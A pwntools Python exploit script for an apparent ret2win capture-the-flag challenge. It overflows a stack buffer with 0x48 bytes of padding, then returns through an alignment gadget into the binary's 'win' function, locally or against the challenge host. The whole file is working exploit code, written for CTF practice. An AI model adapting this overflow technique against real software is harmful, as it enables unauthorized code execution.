#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./vuln")


def start(argv=[], *a, **kw):
    host = args.HOST or 'ret2win.chal.imaginaryctf.org'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

pad = 0x40 + 0x8
win = elf.symbols["win"]
ret = elf.symbols["main"] + 35

payload = b"A" * pad
payload += flat(ret, win)

io.sendline(payload)

io.interactive()
